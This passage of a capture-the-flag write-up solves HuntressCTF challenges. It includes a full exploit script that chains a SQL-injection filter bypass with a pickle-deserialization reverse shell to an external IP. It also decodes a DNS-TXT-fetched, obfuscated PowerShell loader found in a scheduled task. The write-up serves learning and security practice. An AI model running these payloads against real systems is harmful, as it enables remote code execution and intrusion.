# Use ThreadPoolExecutor for multithreading
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    future_to_perm = {executor.submit(check_permutation, perm): perm for perm in perms}
    for future in concurrent.futures.as_completed(future_to_perm):
        result = future.result()
        if result:
            print(result)
            executor.shutdown(wait=False, cancel_futures=True)
            break
```

And the permutation `bfdaec` gives us the flag! 

# MOVEable

> Ever wanted to move your files? You know, like with a fancy web based GUI instead of just FTP or something?   Well now you can, with our super secure app, **MOVEable**!  Escalate your privileges and find the flag.

We're provided with a simple Flask application, with just one component: `app.py`. Based on the name, `MOVEable` and because this is HuntressCTF (which means John Hammond is involved) I figured this is a reference to `MOVEit` because of the name and the fact John Hammond helped research MOVEit to uncover the attack chain. For those unfamiliar, the MOVEit vulnerability allowed unauthenticated RCE via SQLi and deserialization. 

The first thing I looked at was the login functionality:

```python
@app.route('/login', methods=['POST'])
def login_user():
    username = DBClean(request.form['username'])
    password = DBClean(request.form['password'])
    print(username, password)
    
    conn = get_db()
    c = conn.cursor()
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(sql)
    c.executescript(sql)
    user = c.fetchone()
    print(user)
    if user:
        c.execute(f"SELECT sessionid FROM activesessions WHERE username=?", (username,))
        active_session = c.fetchone()
        if active_session:
            session_id = active_session[0]
        else:
            c.execute(f"SELECT username FROM users WHERE username=?", (username,))
            user_name = c.fetchone()
            if user_name:
                session_id = str(uuid.uuid4())
                c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")
            else:
                flash("A session could be not be created")
                return logout()
```

Immediately, two things stood out:
1) The SQL query is crafted via injecting variables aka no parameterization
2) We use `executescript` instead of `execute` which means we can run other queries besides the `SELECT` statement

However, there is also a DBClean function, which (in theory) sanitizes input from SQL injection. It strips ` `, `'`, and `"` and replaces `\` with `'`'. 

```python
def DBClean(string):
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")
```

So we'll probably have to bypass this filter to get SQL injection to login as a user. Let's keep on looking through the code, the next piece the download functionality:

```python
@app.route('/download/<filename>/<sessionid>', methods=['GET'])
def download_file(filename, sessionid):
    conn = get_db()
    c = conn.cursor()
    c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))
    
    active_session = c.fetchone()
    if active_session is None:
        flash('No active session found')
        return redirect(url_for('home'))
    c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))
    
    file_data = c.fetchone()
    if file_data is None:
        flash('File not found')
        return redirect(url_for('files'))

    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    print(file_blob)
    try:    
        return send_file(io.BytesIO(file_blob), attachment_filename=filename, as_attachment=True)
    except Exception as e:
        print(e)
        flash("ERROR: Failed to retrieve file. Are you trying to hack us?!?")
        return redirect(url_for('files'))
```

This is a GET request which takes a `filename` and `sessionid` parameter and will retrieve a file via unpickling.  Remember that `MOVEit` exploited deserialization and here we are... using `pickle`:

> “Pickling” is **the process whereby a Python object hierarchy is converted into a byte stream**, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. (https://docs.python.org/3/library/pickle.html)


![[Pasted image 20241018144415.png]]

So, now we have an attack chain planned out.
1. SQL injection to get a valid user session ID
2. Download `flag.txt` using the provided session ID

Which seems easy, but in reality, it isn't. If we look at the `init_db` function:

```python
def init_db():
    with app.app_context():
        db = get_db()
        c = db.cursor()

        c.execute("CREATE TABLE IF NOT EXISTS users (username text, password text)")
        c.execute("CREATE TABLE IF NOT EXISTS activesessions (sessionid text, username text, timestamp text)")
        c.execute("CREATE TABLE IF NOT EXISTS files (filename text PRIMARY KEY, data blob, sessionid text)")

        c.execute("INSERT OR IGNORE INTO files VALUES ('flag.txt', ?, NULL)",
                  (base64.b64encode(pickle.dumps(b'lol just kidding this isnt really where the flag is')).decode('utf-8'),))
        c.execute("INSERT OR IGNORE INTO files VALUES ('NahamCon-2024-Speakers.xlsx', ?, NULL)",
                  (base64.b64encode(pickle.dumps(b'lol gottem')).decode('utf-8'),))
        db.commit()
```

It poses problems with our plan. The first being that there are no users and the second being the `flag.txt` is not really a flag. So, we need to adjust our attack chain:

1. SQL injection to INSERT a user into the `users` table
2. SQL injection to INSERT a session into the `activesession` table
3. SQL injection to INSERT a malicious pickle into the `files` table
4. Then call the `/download/<file>/<session>` to get our pickle to execute!

With a gameplan in mind, let's attack it. I first started by creating the inverse of DBClean, so I could create normal SQL queries without needing to constantly consider filter bypasses.

```python
def DBEvil(string):
    # Convert a normal SQL injection string into one that will bypass the DBClean function
    evil = ""
    for i in range(0, len(string)):
        if string[i] == "'":
            evil += "\\'"
        elif string[i] == " ":
            evil += "/**/"
        elif string[i] == "\"":
            evil += "\\\""
        else:
            evil += string[i]
    return evil
```

This replaces `'` with `\` (which DBClean will then turn back into a `'`), spaces into `/**/` which SQLite will parse as whitespace, and `"` with `\"`. 

Next, we generate our queries. For example, inserting a malicious user. And just a reminder, we're able to call multiple queries, ie: `SELECT ...; INSERT` because the Flask app uses `.executescript()`. If it uses `.execute()`, this specific attack chain would have been mitigated.

```python
DBEvil("' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'hacker'); --")

# \'/**/OR/**/1=1;/**/INSERT/**/INTO/**/users/**/(username,/**/password)/**/VALUES/**/(\'hacker\',/**/\'hacker\');/**/--
```

We do the same thing for session:

```python
_uuid = str(uuid.uuid4())

DBEvil(f"' OR 1=1; INSERT INTO activesessions (sessionid, username, timestamp) VALUES ('{_uuid}', 'hacker', '2024-10-18 13:27:27.549650'); --")
```

And then we generate our malicious pickle:

```python
class ReadFlag:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['bash', '-c', 'bash -i >& /dev/tcp/37.120.205.205/47465 0>&1'],))

_filename = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))

pickle_data = base64.b64encode(pickle.dumps(ReadFlag())).decode('utf-8')

insert_file = DBEvil(f"' OR 1=1; INSERT INTO files (filename, data, sessionid) VALUES ('{_filename}', '{pickle_data}', '{_uuid}'); --")
```

We now have three SQL queries which will insert a user, session, and file. All we need to do now is `/download/<filename>/<session>` and when `pickle.loads()` is called, our pickle will get unpickled and turned into a Python object, causing `subprocess` to run our reverse shell! Putting it all together into a `solve.py`:

```python
import pickle
import base64
import requests
import uuid
import random

# class ReadFlag:
#     def __reduce__(self):
#         import subprocess
#         return (subprocess.check_output, (['cat', '/tmp/database.db'],))

# /bin/bash -i >& /dev/tcp/37.120.205.205/47465 0>&1
class ReadFlag:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['bash', '-c', 'bash -i >& /dev/tcp/37.120.205.205/47465 0>&1'],))

def DBClean(string):
    # This blocks the following characters: [ [space], ', "]
    # Converts all backslashes to single quotes
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")

def DBEvil(string):
    # Convert a normal SQL injection string into one that will bypass the DBClean function
    evil = ""
    for i in range(0, len(string)):
        if string[i] == "'":
            evil += "\\'"
        elif string[i] == " ":
            evil += "/**/"
        elif string[i] == "\"":
            evil += "\\\""
        else:
            evil += string[i]
    return evil

# c.execute("CREATE TABLE IF NOT EXISTS users (username text, password text)")
# c.execute("CREATE TABLE IF NOT EXISTS activesessions (sessionid text, username text, timestamp text)")
# c.execute("CREATE TABLE IF NOT EXISTS files (filename text PRIMARY KEY, data blob, sessionid text)")

BASE = "http://challenge.ctf.games:32217/"

_uuid = str(uuid.uuid4())
_filename = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
print(_uuid, _filename)

# Register a new user
insert_user = DBEvil("' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'hacker'); --")
print(insert_user)
r = requests.post(BASE + "login", data={"username": insert_user, "password": "hacker"})
if "Username or password is incorrect" in r.text:
    print("Payload sent")
else:
    print(r.text)
    exit()

# Insert a new session for the user
insert_session = DBEvil(f"' OR 1=1; INSERT INTO activesessions (sessionid, username, timestamp) VALUES ('{_uuid}', 'hacker', '2024-10-18 13:27:27.549650'); --")
r = requests.post(BASE + "login", data={"username": insert_session, "password": "hacker"})
if "Username or password is incorrect" in r.text:
    print("Payload sent")
else:
    print(r.text)
    exit()

# Insert a new file with RCE pickle data
pickle_data = base64.b64encode(pickle.dumps(ReadFlag())).decode('utf-8')
insert_file = DBEvil(f"' OR 1=1; INSERT INTO files (filename, data, sessionid) VALUES ('{_filename}', '{pickle_data}', '{_uuid}'); --")
r = requests.post(BASE + "login", data={"username": insert_file, "password": "hacker"})
if "Username or password is incorrect" in r.text:
    print("Payload sent")
else:
    print(r.text)
    exit()

# Get the flag
r = requests.get(BASE + f"download/{_filename}/{_uuid}")
with open("flag.txt", "wb") as f:
    f.write(r.content)
```

# Palimpsest

> Our IT department was setting up a new workstation and started encountering some strange errors while installing software.  The technician noticed a strange scheduled task and luckily backed it up and grabbed some log files before wiping the machine!  Can you figure out what's going on?

We're provided four files:
1. `Application.evtx`
2. `Security.evtx`
3. `System.evtx`
4. `Updater Service.xml`

Based on the challenge prompt, the first thing to investigate is the scheduled service. Doing `cat Updater\ Service.xml` there's one section that really stands out:

```xml
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -Command "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName 5aa456e4dbed10b.pyrchdata.com -Type txt | Select-Object -ExpandProperty Strings))))"</Arguments>
    </Exec>
  </Actions>
```

It grabs `TXT` records for the domain 5aa456e4dbed10b.pyrchdata.com, decodes from base64, and executes it as a PowerShell command. So, let's query the TXT record.

```bash
nslookup -q=txt 5aa456e4dbed10b.pyrchdata.com

5aa456e4dbed10b.pyrchdata.com	text = "LiggJFNIRWxsaURbMV0rJFNIRWxMaWRbMTNdKydYJykoIG5lVy1vQkpFQ1QgSW8uQ29tUHJlU3NJT04uZEVmbEFUZVN0UmVBbShbc3lTVGVtLklPLm1FTU9SWXNUUkVBTV1bc1lzdEVNLmNPbnZlUlRdOjpGUk9tQkFzRTY0c3RyaW5HKCAnWlZiTGF0eFFEUDBWTFZwbUp0d0o5MjE3bVQ1b0N5V0IwbDBJSmFWWkpKQVdzaWlCdHY5ZTZVaTY" "5clFMRzE5TDF1UG9TUEw1ZnYvdTd2UHg1KzNUL2NYWGoyOXBkL2I0N2Vsc2R6aS92SDI4dXk0aHBaQnZqZzlYOTk5M3U4TitmLzM2L2NYVDljME43U25sUkNIRmhRS2xPUE05eDlDbVFEWEtpOGl5M01MU1dTQlhUWHlGVkZpdFVoQ1ZOTEhHUktITVFiOHZtUzgrSkxaYnNnaGdIOC9RVEltZjJnTERLYk4yNjJ3bmk1Z042eHU1NER1TGkwSk" "RvY21uSkJwOG1xQ1FVb2U4U2NEWnpDYUpoRDMzaUpCY1lla2lSNjVOczViUVNHNTZTaERLUGNVSmVqV1lWTlhFQjdrVEpOZkx4Z1hCaDBValJ3M0Z2cHhENW5nVVh2RUFqSkZkbEJyQllaNFVQd2RUWEJDQ3cwR0JGWUdDQ1VlQ0tCbWtCTkFxeTVyR2xJRXJuWmpYYW51eFBFQXIwWDlHK2FFMnJWTkxva3NHL0ZxWVdkWElpZ0dIZUZFbDJ0W" "XBXQUc3Z3d3a1VxaHNRMHBOclVKUllSQmFaVWhBQnRiamNOaWtPT3d4aU5GV3lHdXBJdFI2STdFQ0JXRXFERGpZYklBNnFvSlRrdXp3RU1SY25pMW9NVmVNVDRKRlFaU0ZsSjZWOFpKQ21sL0xzeWgyakJyTHhVK2JrUy9MQmVVcXBHdU9ndHlVc095MUcweXdJeGxKMkxYb1M0RmRCSXdLQVpKNTFFamU4YXVHSWk0R3p4d1U4YVpJZ2lsS3Fp" "VU1Tam1QUktDOXIrMHFvcWlaVDI1RHFXQmRKTFZubEtwenpkcVdBQXBqMC9Nb0JRME9haHNyTjFzWTdhNHNhY29GV2psQ3ErTlVsUWNWTUhNbVBUdWpORCtsTlhraWk3VU5VbHh6WXJwTHNxb3B3RWsrR2c5SzB5VjhwV1FQUmdDcG92UGFjbVNHMW1tMGxWdFlhTXQvQWFrNFBaZDVUSVl5TzJOdFBuRVh6RFlZbmNoSUxnWXJPRWdvR0NJc2I" "zZi9PbXRHcVdtRmM5VCtCTGVyY3dtblBDdUpxRVRGanNtdXRiRjRyTktrRVBGVEtSNFUraklxOURVWkdSSUdId3NhSUtHZWJUc2dRbytrVFpDV3lkNlg0Z3lLN21aMmNGWk1TbFFxcW1BWmJGQVZrRGViUXZMb3BSZlhUQmNGVHZPS2p1L3FRU0pmRFZpTGpCVzI5c1JDb3c5QW1NM095alpyMXNsV2ZOb0NxOEY2blljTms1OUJvVEh4Wk9BMW" "xXS1FKeHZGUlpzdjZTekI4a25sTkFNWlJyb0RFRDhXd1VTMlNSZWRaU1FqWmNGTUl0dTdZMCtDY2pIL0M2d0Rvd0dmN0hiYUxuZmJtcHQyMGhucE84aHpHc3ZNb1NUL2V2WU5OaUk0eGJjdVRycStkdGJZTnJJbHZOdld3UUpRdGwyNGdzNTJpazFPQTkyMlRLZkQ3NWYwaS9CREpMOURMNzdROGRYejFhZGRmRzV2ZG9jL2REZysvUGh3eVg5T" "mZ3RT0nICkgLFtJby5jb01QUkVzc0lvbi5DT01QcmVTU2lPTk1vREVdOjpkRWNvbXBSRVNzKXwgZm9yRWFjSC1vYkpFQ1Qge25lVy1vQkpFQ1Qgc3lzVEVtLklPLlNUUkVBTVJFYURlUiggJF8gLCBbVEV4VC5lbmNvRGlOR106OmFzQ2lpICkgfXwgZm9yZUFDSC1PQmpFQ1QgeyRfLlJFQWRUb0VuZCgpIH0gKQ=="
```

Then, we can decode from base64:

```bash
echo "LiggJFNIRWxsaURbMV0rJFNIRWxMaWRbMTNdKydYJykoIG5lVy1vQkpFQ1QgSW8uQ29tUHJlU3NJT04uZEVmbEFUZVN0UmVBbShbc3lTVGVtLklPLm1FTU9SWXNUUkVBTV1bc1lzdEVNLmNPbnZlUlRdOjpGUk9tQkFzRTY0c3RyaW5HKCAnWlZiTGF0eFFEUDBWTFZwbUp0d0o5MjE3bVQ1b0N5V0IwbDBJSmFWWkpKQVdzaWlCdHY5ZTZVaTY" "5clFMRzE5TDF1UG9TUEw1ZnYvdTd2UHg1KzNUL2NYWGoyOXBkL2I0N2Vsc2R6aS92SDI4dXk0aHBaQnZqZzlYOTk5M3U4TitmLzM2L2NYVDljME43U25sUkNIRmhRS2xPUE05eDlDbVFEWEtpOGl5M01MU1dTQlhUWHlGVkZpdFVoQ1ZOTEhHUktITVFiOHZtUzgrSkxaYnNnaGdIOC9RVEltZjJnTERLYk4yNjJ3bmk1Z042eHU1NER1TGkwSk" "RvY21uSkJwOG1xQ1FVb2U4U2NEWnpDYUpoRDMzaUpCY1lla2lSNjVOczViUVNHNTZTaERLUGNVSmVqV1lWTlhFQjdrVEpOZkx4Z1hCaDBValJ3M0Z2cHhENW5nVVh2RUFqSkZkbEJyQllaNFVQd2RUWEJDQ3cwR0JGWUdDQ1VlQ0tCbWtCTkFxeTVyR2xJRXJuWmpYYW51eFBFQXIwWDlHK2FFMnJWTkxva3NHL0ZxWVdkWElpZ0dIZUZFbDJ0W" "XBXQUc3Z3d3a1VxaHNRMHBOclVKUllSQmFaVWhBQnRiamNOaWtPT3d4aU5GV3lHdXBJdFI2STdFQ0JXRXFERGpZYklBNnFvSlRrdXp3RU1SY25pMW9NVmVNVDRKRlFaU0ZsSjZWOFpKQ21sL0xzeWgyakJyTHhVK2JrUy9MQmVVcXBHdU9ndHlVc095MUcweXdJeGxKMkxYb1M0RmRCSXdLQVpKNTFFamU4YXVHSWk0R3p4d1U4YVpJZ2lsS3Fp" "VU1Tam1QUktDOXIrMHFvcWlaVDI1RHFXQmRKTFZubEtwenpkcVdBQXBqMC9Nb0JRME9haHNyTjFzWTdhNHNhY29GV2psQ3ErTlVsUWNWTUhNbVBUdWpORCtsTlhraWk3VU5VbHh6WXJwTHNxb3B3RWsrR2c5SzB5VjhwV1FQUmdDcG92UGFjbVNHMW1tMGxWdFlhTXQvQWFrNFBaZDVUSVl5TzJOdFBuRVh6RFlZbmNoSUxnWXJPRWdvR0NJc2I" "zZi9PbXRHcVdtRmM5VCtCTGVyY3dtblBDdUpxRVRGanNtdXRiRjRyTktrRVBGVEtSNFUraklxOURVWkdSSUdId3NhSUtHZWJUc2dRbytrVFpDV3lkNlg0Z3lLN21aMmNGWk1TbFFxcW1BWmJGQVZrRGViUXZMb3BSZlhUQmNGVHZPS2p1L3FRU0pmRFZpTGpCVzI5c1JDb3c5QW1NM095alpyMXNsV2ZOb0NxOEY2blljTms1OUJvVEh4Wk9BMW" "xXS1FKeHZGUlpzdjZTekI4a25sTkFNWlJyb0RFRDhXd1VTMlNSZWRaU1FqWmNGTUl0dTdZMCtDY2pIL0M2d0Rvd0dmN0hiYUxuZmJtcHQyMGhucE84aHpHc3ZNb1NUL2V2WU5OaUk0eGJjdVRycStkdGJZTnJJbHZOdld3UUpRdGwyNGdzNTJpazFPQTkyMlRLZkQ3NWYwaS9CREpMOURMNzdROGRYejFhZGRmRzV2ZG9jL2REZysvUGh3eVg5T" "mZ3RT0nICkgLFtJby5jb01QUkVzc0lvbi5DT01QcmVTU2lPTk1vREVdOjpkRWNvbXBSRVNzKXwgZm9yRWFjSC1vYkpFQ1Qge25lVy1vQkpFQ1Qgc3lzVEVtLklPLlNUUkVBTVJFYURlUiggJF8gLCBbVEV4VC5lbmNvRGlOR106OmFzQ2lpICkgfXwgZm9yZUFDSC1PQmpFQ1QgeyRfLlJFQWRUb0VuZCgpIH0gKQ==" | base64 -d
```

```ps1
.( $SHElliD[1]+$SHElLid[13]+'X')( neW-oBJECT Io.ComPreSsION.dEflATeStReAm([sySTem.IO.mEMORYsTREAM][sYstEM.cOnveRT]::FROmBAsE64strinG( 'ZVbLatxQDP0VLVpmJtwJ9217mT5oCyWB0l0IJaVZJJAWsiiBtv9e6Ui69rQLG19L1uPoSPL5fv/u7vPx5+3T/cXXj29pd/b47elsdzi/vH28uy4hpZBvjg9X9993u8N+f/36/cXT9c0N7SnlRCHFhQKlOPM9x9CmQDXKi8iy3MLSWSBXTXyFVFitUhCVNLHGRKHMQb8vmS8+JLZbsghgH8/QTImf2gLDKbN262wni5gN6xu54DuLi0JDocmnJBp8mqCQUoe8ScDZzCaJhD33iJBcYekiR65Ns5bQSG56ShDKPcUJejWYVNXEB7kTJNfLxgXBh0UjRw3FvpxD5ngUXvEAjJFdlBrBYZ4UPwdTXBCCw0GBFYGCCUeCKBmkBNAqy5rGlIErnZjXanuxPEAr0X9G+aE2rVNLoksG/FqYWdXIigGHeFEl2tYpWAG7gwwkUqhsQ0pNrUJRYRBaZUhABtbjcNikOOwxiNFWyGupItR6I7ECBWEqDDjYbIA6qoJTkuzwEMRcni1oMVeMT4JFQZSFlJ6V8ZJCml/Lsyh2jBrLxU+bkS/LBeUqpGuOgtyUsOy1G0ywIxlJ2LXoS4FdBIwKAZJ51Eje8auGIi4GzxwU8aZIgilKqiUMSjmPRKC9r+0qoqiZT25DqWBdJLVnlKpzzdqWAApj0/MoBQ0OahsrN1sY7a4sacoFWjlCq+NUlQcVMHMmPTujND+lNXkii7UNUlxzYrpLsqopwEk+Gg9K0yV8pWQPRgCpovPacmSG1mm0lVtYaMt/Aak4PZd5TIYyO2NtPnEXzDYYnchILgYrOEgoGCIsb3f/OmtGqWmFc9T+BLercwmnPCuJqETFjsmutbF4rNKkEPFTKR4U+jIq9DUZGRIGHwsaIKGebTsgQo+kTZCWyd6X4gyK7mZ2cFZMSlQqqmAZbFAVkDebQvLopRfXTBcFTvOKju/qQSJfDViLjBW29sRCow9AmM3OyjZr1slWfNoCq8F6nYcNk59BoTHxZOA1lWKQJxvFRZsv6SzB8knlNAMZRroDED8WwUS2SRedZSQjZcFMItu7Y0+CcjH/C6wDowGf7HbaLnfbmpt20hnpO8hzGsvMoST/evYNNiI4xbcuTrq+dtbYNrIlvNvWwQJQtl24gs52ik1OA922TKfD75f0i/BDJL9DL77Q8dXz1addfG5vdoc/dDg+/PhwyX9NfwE=' ) ,[Io.coMPREssIon.COMPreSSiONMoDE]::dEcompRESs)| forEacH-obJECT {neW-oBJECT sysTEm.IO.STREAMREaDeR( $_ , [TExT.encoDiNG]::asCii ) }| foreACH-OBjECT {$_.REAdToEnd() } )
```

We have some slightly obfuscated PowerShell. It's pretty apparent what it's doing, based on the `neW-oBJECT Io.ComPreSsION.dEflATeStReAm([sySTem.IO.mEMORYsTREAM][sYstEM.cOnveRT]::FROmBAsE64string`. Luckily, I have a handy Python script called [deflate.py](https://github.com/landoncrabtree/ctf-toolbox/blob/main/reverse-engineering/deflate.py) that allows me to deflate PowerShell memorystreams without using PowerShell. Updating the base64 string in the script and running the script:

```bash
python3 deflate.py
```

```ps1
.((GeT-variAbLE '*mdr*').Name[3,11,2]-jOin'')(([CHAr[]] ( 121 ,109 , 108 , 20,57, 40, 100 ,125,96 , 6 , 41, 4,13, 24 ,0, 117,127 ,38,108 , 32, 38,111 ,32 ,38 ,109,32 ,127 ,112 ,59,125,122, 56, 122 ,113,122, 52, 50 ,122, 113 , 122 ,115 ,59 , 52 ,17,122,116 , 125, 102,125,121 , 38 ,60 , 32 , 125, 96,125 , 105,109 ,109, 109,109 ,115 , 115 ,107 , 104,109,109, 109, 102 ,125,121,38 ,63 , 32 , 125 , 96, 125, 125 ,121 , 109, 108,20 ,57, 40 ,100, 103 , 103,117 , 127, 38,108 , 32,38 , 109 ,32,38,111 , 32,127 ,125, 112 , 59,125, 122, 47 ,52 , 122,113, 117 , 127, 38 , 108, 32, 38 , 109, 32 ,127,125, 112 , 59,122 ,45, 56, 51, 10 ,122,113 , 122 ,18,122 , 116 , 113, 122 , 41 , 56 ,122 ,116 ,115 , 20 ,51,43 ,50 , 54 , 56,117 ,117,23 ,50, 52,51,112, 13 , 60,41 ,53 ,125 , 112, 13,60 ,41 ,53 ,125,121,38,24 ,51,11, 103 , 60, 61 , 13 , 61 ,45 , 61,25 ,28, 41 , 60 ,32,125,112 ,30 , 53 , 52, 49, 57, 13,60 , 41 , 53,125, 59,49,60, 58 ,115, 48 , 45,105,116 ,116 ,102,125 ,26 , 56 ,41 , 112,24 ,43, 56 , 51,41 ,17, 50, 58,125, 112,17,50,58 , 19 , 60,48,56 ,125 ,117,127 , 38,109,32,38 , 111 , 32, 38, 108 ,32 ,38, 110,32,127,125 ,112 , 59 , 125,122,28,45, 122, 113,122 , 49,52,62,60 ,41 , 52 , 122, 113 ,122, 45,122 ,113, 122 ,50 ,51, 122 ,116 , 125 ,112 ,14 ,50, 40 , 47 ,62, 56 ,125 ,117 , 127 , 38, 109, 32,38, 111,32 ,38, 108,32, 127 , 112,59 ,122, 48 , 46, 49 ,51,46,41 , 60,49,122 , 113,122 ,56,47, 122,113 ,122, 49 ,122 , 116 ,125,33 ,125 ,98 , 125 , 38,125 , 121 , 38, 28,32 ,125 , 112,62, 50,51,41 , 60 ,52 ,51,46 ,125, 121 , 38,2,32, 115,127 ,20, 51, 61 , 46 ,41 , 61 , 28 , 51, 30, 56 ,61, 52 , 25 , 127,125 , 32, 125 ,33,125 , 14 , 50, 47 ,41,112 , 18 ,63, 55 ,56, 62 , 41, 125, 20, 51, 57 ,56,37, 125, 33, 125,120, 125 ,38, 125 , 121 , 38, 30 ,32 , 125 ,96 , 125 , 121 ,38 , 2,32 , 115 , 127, 57,61 , 28 , 9, 60 , 127,102 ,125 ,121 , 38, 63, 32 , 115 ,117,127,38,108 ,32, 38, 109 ,32,127,112,59,125,122, 52 ,41 ,56 ,122 ,113 , 122,10, 47, 122, 116 , 115,20 , 51 ,43 ,50 ,54 ,56 , 117 ,121, 38 , 30,32,113,125,109,113,125 ,121 , 38 ,30, 32,115 ,127 ,17 , 56, 19 , 61, 26 ,9, 53, 127 ,116 , 125, 32 ,102 , 125 , 121 ,38, 63, 32, 115, 117,127 ,38, 108 , 32, 38 ,109, 32, 127 , 125,112, 59,125 , 117 , 127, 38, 109 ,32 , 38 ,108, 32,127, 125 , 112,59,125,122,49 , 50, 46 ,122 , 113 , 122 ,56,122 , 116, 113 ,122 ,30,122 , 116 ,115,20 , 51, 43, 50, 54 ,56 ,117 ,116 )|% { [CHAr] ( $_ -BxOR'0x5D')} )-joIN'')
```

Another layer of obfuscation. This time we have an array of numbers. At the very end, we also see a `-BxOR'ox5D'` statement, so looks like it's iterating through each element of the array and XORing with 0x5d. We can reverse this with a simple Python script as well 😄

```python
ascii = [121 ,109 , 108 , 20,57, 40, 100 ,125,96 , 6 , 41, 4,13, 24 ,0, 117,127 ,38,108 , 32, 38,111 ,32 ,38 ,109,32 ,127 ,112 ,59,125,122, 56, 122 ,113,122, 52, 50 ,122, 113 , 122 ,115 ,59 , 52 ,17,122,116 , 125, 102,125,121 , 38 ,60 , 32 , 125, 96,125 , 105,109 ,109, 109,109 ,115 , 115 ,107 , 104,109,109, 109, 102 ,125,121,38 ,63 , 32 , 125 , 96, 125, 125 ,121 , 109, 108,20 ,57, 40 ,100, 103 , 103,117 , 127, 38,108 , 32,38 , 109 ,32,38,111 , 32,127 ,125, 112 , 59,125, 122, 47 ,52 , 122,113, 117 , 127, 38 , 108, 32, 38 , 109, 32 ,127,125, 112 , 59,122 ,45, 56, 51, 10 ,122,113 , 122 ,18,122 , 116 , 113, 122 , 41 , 56 ,122 ,116 ,115 , 20 ,51,43 ,50 , 54 , 56,117 ,117,23 ,50, 52,51,112, 13 , 60,41 ,53 ,125 , 112, 13,60 ,41 ,53 ,125,121,38,24 ,51,11, 103 , 60, 61 , 13 , 61 ,45 , 61,25 ,28, 41 , 60 ,32,125,112 ,30 , 53 , 52, 49, 57, 13,60 , 41 , 53,125, 59,49,60, 58 ,115, 48 , 45,105,116 ,116 ,102,125 ,26 , 56 ,41 , 112,24 ,43, 56 , 51,41 ,17, 50, 58,125, 112,17,50,58 , 19 , 60,48,56 ,125 ,117,127 , 38,109,32,38 , 111 , 32, 38, 108 ,32 ,38, 110,32,127,125 ,112 , 59 , 125,122,28,45, 122, 113,122 , 49,52,62,60 ,41 , 52 , 122, 113 ,122, 45,122 ,113, 122 ,50 ,51, 122 ,116 , 125 ,112 ,14 ,50, 40 , 47 ,62, 56 ,125 ,117 , 127 , 38, 109, 32,38, 111,32 ,38, 108,32, 127 , 112,59 ,122, 48 , 46, 49 ,51,46,41 , 60,49,122 , 113,122 ,56,47, 122,113 ,122, 49 ,122 , 116 ,125,33 ,125 ,98 , 125 , 38,125 , 121 , 38, 28,32 ,125 , 112,62, 50,51,41 , 60 ,52 ,51,46 ,125, 121 , 38,2,32, 115,127 ,20, 51, 61 , 46 ,41 , 61 , 28 , 51, 30, 56 ,61, 52 , 25 , 127,125 , 32, 125 ,33,125 , 14 , 50, 47 ,41,112 , 18 ,63, 55 ,56, 62 , 41, 125, 20, 51, 57 ,56,37, 125, 33, 125,120, 125 ,38, 125 , 121 , 38, 30 ,32 , 125 ,96 , 125 , 121 ,38 , 2,32 , 115 , 127, 57,61 , 28 , 9, 60 , 127,102 ,125 ,121 , 38, 63, 32 , 115 ,117,127,38,108 ,32, 38, 109 ,32,127,112,59,125,122, 52 ,41 ,56 ,122 ,113 , 122,10, 47, 122, 116 , 115,20 , 51 ,43 ,50 ,54 ,56 , 117 ,121, 38 , 30,32,113,125,109,113,125 ,121 , 38 ,30, 32,115 ,127 ,17 , 56, 19 , 61, 26 ,9, 53, 127 ,116 , 125, 32 ,102 , 125 , 121 ,38, 63, 32, 115, 117,127 ,38, 108 , 32, 38 ,109, 32, 127 , 125,112, 59,125 , 117 , 127, 38, 109 ,32 , 38 ,108, 32,127, 125 , 112,59,125,122,49 , 50, 46 ,122 , 113 , 122 ,56,122 , 116, 113 ,122 ,30,122 , 116 ,115,20 , 51, 43, 50, 54 ,56 ,117 ,116]

for i in ascii:
    # xor 0x5D
    print(chr(i ^ 0x5D), end="")
```

```ps1
$01Idu9 =[tYPE]("{1}{2}{0}"-f 'e','io','.fiL') ; ${a} = 40000..65000; ${b} =  $01Idu9::("{1}{0}{2}" -f 'ri',("{1}{0}" -f'penW','O'),'te').Invoke((Join-Path -Path ${EnV:a`P`p`DAta} -ChildPath flag.mp4)); Get-EventLog -LogName ("{0}{2}{1}{3}" -f 'Ap','licati','p','on') -Source ("{0}{2}{1}"-f'mslnstal','er','l') | ? { ${A} -contains ${_}."In`st`AnCe`iD" } | Sort-Object Index | % { ${C} = ${_}."d`ATa"; ${b}.("{1}{0}"-f 'ite','Wr').Invoke(${C}, 0, ${C}."LeN`GTh") }; ${b}.("{1}{0}" -f ("{0}{1}" -f 'los','e'),'C').Invoke()
```

This is the last layer! It's more heavily obfuscated than the others, but it's still pretty trivial. 
* Create an array of numbers 40000-65000
* Open file `%AppData%/flag.mp4`
* Call `Get-EventLog` on `Application` logs
	* Filter by `Source` = `mslnstaller`
	* Filter by `InstanceId` in range of 40000-65000
* Sort based on `Index`
* Write the `Data` to `flag.mp4`
* Close the handle on `%AppData%/flag.mp4`

You can easily reverse this if you're on Windows by using PowerShell, which is what my team did initially:

```ps1
$fileHandler = [io.file]::OpenWrite((Join-Path -Path ${Env:APPDATA} -ChildPath "flag.mp4"))
$instanceIDs = 40000..65000

# Load events from the specified .evtx file
$eventLogPath = ".\Application.evtx"
Get-WinEvent -Path $eventLogPath |
    Where-Object { $_.ProviderName -eq "Mslnstaller" -and $instanceIDs -contains $_.Id } | 
    Sort-Object RecordId |
    ForEach-Object { 
        $data = $_.Properties[1].Value 
        $fileHandler.Write($data, 0, $data.Length)
    }

$fileHandler.Close()
```

